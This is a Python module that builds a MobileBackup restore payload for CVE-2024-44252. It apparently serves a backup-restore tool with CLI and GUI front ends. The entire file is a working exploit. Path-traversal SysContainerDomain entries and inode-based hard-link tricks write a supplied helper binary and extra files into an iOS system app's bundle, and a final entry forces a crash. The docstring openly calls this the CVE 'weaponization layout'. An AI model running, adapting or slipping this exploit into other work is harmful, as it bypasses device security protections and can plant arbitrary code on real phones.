"""
Shared MobileBackup CVE-2024-44252 payload builder.

Both mxrestore.py (CLI) and mxrestore-gui (Tk GUI) import build_backup_files
from here so the CVE weaponization layout lives in exactly one place. Do not
add CLI- or GUI-specific concerns here.
"""
from sparserestore import backup


def build_backup_files(helper_contents: bytes, app_uuid: str, system_app: str,
                       extra_bundle_files: list[tuple[str, bytes]] | None = None):
    """Construct the MobileBackup CVE-2024-44252 payload as a list of
    sparserestore.backup.BackupFile records.

    Mechanism: a RootDomain ConcreteFile holds the real bytes; a parallel
    SysContainerDomain path-traversal ConcreteFile to the bundle gets the
    same inode → MobileBackup hard-links them → the bundle path receives
    the bytes. A third ConcreteFile at /var/.backup.i/ with a fresh inode
    breaks the hard link so the bundle file persists as its own copy.

    For each extra (filename, content) tuple, we add a parallel pair with a
    unique inode (1, 2, 3, …). MobileBackup uses the inode as the hard-link
    grouping key, so different inodes land in different bundle slots.
    """
    bundle_traversal = (
        f"SysContainerDomain-../../../../../../../.."
        f"/var/backup/var/containers/Bundle/Application/{app_uuid}/{system_app}"
    )

    files = [
        backup.Directory("", "RootDomain"),
        backup.Directory("Library", "RootDomain"),
        backup.Directory("Library/Preferences", "RootDomain"),
        # Pair 0: the helper binary itself (inode=0)
        backup.ConcreteFile("Library/Preferences/temp", "RootDomain",
                            owner=33, group=33, contents=helper_contents, inode=0),
        backup.Directory("", bundle_traversal, owner=33, group=33),
        backup.ConcreteFile(
            "",
            f"{bundle_traversal}/{system_app.split('.')[0]}",
            owner=33, group=33, contents=b"", inode=0,
        ),
        backup.ConcreteFile(
            "",
            "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
            owner=501, group=501, contents=b"",
        ),  # Break the hard link for pair 0
    ]

    for i, (filename, content) in enumerate(extra_bundle_files or [], start=1):
        temp_name = f"temp_extra_{i}"
        files += [
            backup.ConcreteFile(f"Library/Preferences/{temp_name}", "RootDomain",
                                owner=33, group=33, contents=content, inode=i),
            backup.ConcreteFile(
                "",
                f"{bundle_traversal}/{filename}",
                owner=33, group=33, contents=b"", inode=i,
            ),
            backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/{temp_name}",
                owner=501, group=501, contents=b"",
            ),  # Break the hard link for this extra file
        ]

    files.append(backup.ConcreteFile(
        "",
        "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose",
        contents=b"",
    ))
    return files
